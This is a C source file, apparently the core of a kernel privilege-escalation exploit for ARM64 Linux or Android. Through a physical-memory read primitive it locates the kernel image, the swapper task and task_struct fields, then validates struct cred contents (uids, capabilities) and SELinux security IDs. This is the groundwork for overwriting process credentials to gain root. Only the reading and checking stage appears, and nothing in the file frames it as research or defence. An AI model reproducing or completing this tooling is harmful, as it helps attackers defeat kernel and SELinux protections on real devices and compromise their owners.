/* Escalation scanner core - see esc_scan.h for the model. */
#include "esc_scan.h"

#include <string.h>

/* ---- VA/PA helpers ---- */

static uint64_t g_img_base = ESC_IMAGE_PA_DEFAULT;
static uint64_t g_img_size = ESC_IMAGE_SIZE_DEFAULT;

void esc_set_image_range(uint64_t base_pa, uint64_t size)
{
	g_img_base = base_pa;
	g_img_size = size;
}

int esc_image_range_contains(uint64_t pa)
{
	return pa >= g_img_base && pa < g_img_base + g_img_size;
}

int esc_is_linear_va(uint64_t va)
{
	return va >= ESC_LINEAR_BASE &&
	       va < ESC_LINEAR_BASE + ESC_RAM_SIZE;
}

uint64_t esc_linear_pa(uint64_t va)
{
	return va - ESC_LINEAR_BASE;
}

int esc_is_image_va(uint64_t va, uint64_t image_va_base)
{
	/* base is KIMAGE_VADDR semantics (VA = base + PA), so the offset
	 * IS a physical address and must land inside the live image
	 * extent (dynamic: the 0921 image is far larger than the boot.img
	 * constant). */
	uint64_t off = va - image_va_base;

	return va >= image_va_base &&
	       off >= g_img_base && off < g_img_base + g_img_size;
}

uint64_t esc_image_pa(uint64_t va, uint64_t image_va_base)
{
	return va - image_va_base;
}

/* ---- image scan helpers ---- */

int esc_image_magic_ok(const uint8_t *page)
{
	uint32_t magic;

	memcpy(&magic, page + 0x38, sizeof magic);
	return magic == 0x644d5241u; /* "ARM\x64" */
}

void esc_image_header_raw(const uint8_t *page, uint64_t *text_off,
			  uint64_t *image_size)
{
	memcpy(text_off, page + 0x08, 8);
	memcpy(image_size, page + 0x10, 8);
}

int esc_image_header(const uint8_t *page, uint64_t *text_off,
		     uint64_t *image_size)
{
	if (!esc_image_magic_ok(page))
		return -1;
	esc_image_header_raw(page, text_off, image_size);
	if (*text_off > 0x40000000ULL || *image_size == 0 ||
	    *image_size > ESC_IMAGE_SIZE_MAX)
		return -1;
	return 0;
}

int esc_page_find_swapper_at(const uint8_t *page, uint32_t from,
			     uint32_t *off)
{
	uint32_t i;

	for (i = from; i + 7 <= ESC_PAGE; i++)
		if (!memcmp(page + i, "swapper", 7)) {
			*off = i;
			return 1;
		}
	return 0;
}


/* ---- v2 candidate prober ---- */

static uint64_t rd64(const uint8_t *p)
{
	uint64_t v;
	memcpy(&v, p, 8);
	return v;
}

static uint32_t rd32(const uint8_t *p)
{
	uint32_t v;
	memcpy(&v, p, 4);
	return v;
}

static int plausible_linear(uint64_t v)
{
	return esc_is_linear_va(v) && !(v & 7u);
}

static int plausible_image(uint64_t v)
{
	return esc_is_image_va(v, ESC_IMAGE_BASE_DEFAULT) &&
	       esc_image_range_contains(v - ESC_IMAGE_BASE_DEFAULT) &&
	       !(v & 7u);
}

void esc_probe_candidate(const uint8_t *raw, uint32_t hit, uint32_t raw_len,
			 struct esc_cand *out)
{
	uint32_t i;

	memset(out, 0, sizeof *out);

	/* locate the tasks list_head: two adjacent linear VAs */
	for (i = 0; i + 16 <= raw_len; i++) {
		uint64_t a = rd64(raw + i), b = rd64(raw + i + 8);

		if (plausible_linear(a) && plausible_linear(b)) {
			out->has_tasks_pair = 1;
			out->tasks_pair_off = i;
			break;
		}
	}

	/* rebuild-relative checks (comm at 0x688) */
	if (hit >= 0x2b0u && raw_len >= hit + 16u) {
		uint64_t a = rd64(raw + hit - 0x2b0);
		uint64_t b = rd64(raw + hit - 0x2a8);

		out->rel_tasks_linear = plausible_linear(a) &&
				       plausible_linear(b);
		out->rel_mm_zero = hit >= 0x268u && rd64(raw + hit - 0x260) == 0;
		out->rel_pid_tgid_zero =
			hit >= 0x1b0u && rd32(raw + hit - 0x1b0) == 0 &&
			hit >= 0x1acu && rd32(raw + hit - 0x1ac) == 0;
		{
			uint64_t c = rd64(raw + hit - 0x10);
			uint64_t d = rd64(raw + hit - 0x8);

			out->rel_cred_pair = c == d && plausible_image(c);
		}
	}
}

/* Read [pa, pa+len) through rd in 4K chunks. */
static int esc_read_range(esc_read_fn rd, uint64_t pa, void *buf,
			  size_t len)
{
	uint8_t *dst = buf;
	uint64_t end = pa + (uint64_t)len;

	while (pa < end) {
		uint64_t chunk = ESC_PAGE - (pa & (ESC_PAGE - 1));
		uint64_t left = end - pa;

		if (chunk > left)
			chunk = left;
		if (!pa || pa >= ESC_RAM_SIZE)
			return -1;
		if (rd(pa, dst, (size_t)chunk))
			return -1;
		pa += chunk;
		dst += chunk;
	}
	return 0;
}


/* ---- offset-free task window analyzer ---- */

void esc_analyze_taskwin(const uint8_t *win, uint32_t win_len,
			 const char *want_comm, int32_t want_pid,
			 struct esc_taskwin *out)
{
	size_t clen = strlen(want_comm);
	uint32_t i;

	memset(out, 0, sizeof *out);
	if (win_len < ESC_TASKWIN_SPAN)
		return;

	memcpy(&out->tasks_next, win + ESC_TASKWIN_TASKS_OFF, 8);

	/* comm: exact string, NUL-terminated inside its 16-byte field */
	for (i = 0; i + clen < win_len; i += 4) {
		if (!memcmp(win + i, want_comm, clen) &&
		    (clen >= 15 || win[i + clen] == 0)) {
			out->has_comm = 1;
			out->comm_off = i;
			break;
		}
	}
	/* pid/tgid: adjacent equal int32s matching want_pid */
	for (i = 0; i + 8 <= win_len; i += 4) {
		int32_t a, b;

		memcpy(&a, win + i, 4);
		memcpy(&b, win + i + 4, 4);
		if (a == want_pid && b == want_pid) {
			out->has_pid_tgid = 1;
			out->pid_off = i;
			break;
		}
	}
}

/* ---- shift-tolerant cred check (v6) ---- */

static int fill_cred_at(const uint8_t *raw, uint32_t uid_off,
			struct esc_credview *c)
{
	uint32_t i;
	uint32_t *ids[] = { &c->uid, &c->gid, &c->suid, &c->sgid,
			    &c->euid, &c->egid, &c->fsuid, &c->fsgid };

	memset(c, 0, sizeof *c);
	c->uid_off = uid_off;
	memcpy(&c->usage, raw + uid_off - 4, 4);
	for (i = 0; i < 8; i++)
		memcpy(ids[i], raw + uid_off + 4u * i, 4);
	memcpy(&c->securebits, raw + uid_off + 0x20, 4);
	memcpy(&c->cap_permitted, raw + uid_off + 0x2c, 8);
	memcpy(&c->cap_effective, raw + uid_off + 0x34, 8);
	memcpy(&c->cap_bset, raw + uid_off + 0x3c, 8);
	memcpy(&c->cap_ambient, raw + uid_off + 0x44, 8);
	memcpy(&c->security, raw + uid_off + 0x74, 8);
	return 0;
}

int esc_check_cred_shifted(esc_read_fn rd, uint64_t cred_pa, int kind,
			   uint32_t expect_id, struct esc_credview *c,
			   uint64_t *tss_pa, uint32_t *osid,
			   uint32_t *sid, const char **reason)
{
	uint8_t raw[0xa8];
	uint8_t tss[8];
	uint32_t off, i, v;
	int found = 0;

	if (reason) *reason = "";
	if (cred_pa & 3u) {
		if (reason) *reason = "cred PA unaligned";
		return -1;
	}
	if (esc_read_range(rd, cred_pa, raw, sizeof raw)) {
		if (reason) *reason = "cred read failed";
		return -1;
	}
	/* Search the 8-run of expect_id over uid..fsgid.  The last usable
	 * shift is 0x2c, not 0x30: the whole 0xa8 layout must fit and
	 * security sits at uid_off+0x74, so 0x2c+0x7c == 0xa8 exactly.
	 * At 0x30 the security read would run 4 bytes past raw[]. */
	for (off = 4; off <= 0x2c && !found; off += 4) {
		found = 1;
		for (i = 0; i < 8; i++) {
			memcpy(&v, raw + off + 4u * i, 4);
			if (v != expect_id) {
				found = 0;
				break;
			}
		}
	}
	if (!found) {
		if (reason) *reason = "no 8-run of expected id";
		return -1;
	}
	off -= 4;
	fill_cred_at(raw, off, c);

	if (c->usage == 0 || c->usage > 0x10000u) {
		if (reason) *reason = "cred usage out of range";
		return -1;
	}
	if (c->securebits > 0xffu) {
		if (reason) *reason = "securebits implausible";
		return -1;
	}
	if (c->cap_ambient & ~c->cap_permitted) {
		if (reason) *reason = "ambient exceeds permitted";
		return -1;
	}
	if (kind == 1 && !c->cap_effective) {
		if (reason) *reason = "kernel cred has no caps";
		return -1;
	}
	if (!c->security || !esc_is_linear_va(c->security) ||
	    (c->security & 7u)) {
		if (reason) *reason = "security ptr not a linear VA";
		return -1;
	}
	*tss_pa = esc_linear_pa(c->security);
	if (esc_read_range(rd, *tss_pa, tss, 8)) {
		if (reason) *reason = "tss read failed";
		return -1;
	}
	memcpy(osid, tss, 4);
	memcpy(sid, tss + 4, 4);
	if (*osid == 0 || *osid > 0xfffffu ||
	    *sid == 0 || *sid > 0xfffffu) {
		if (reason) *reason = "sid implausible";
		return -1;
	}
	return 0;
}
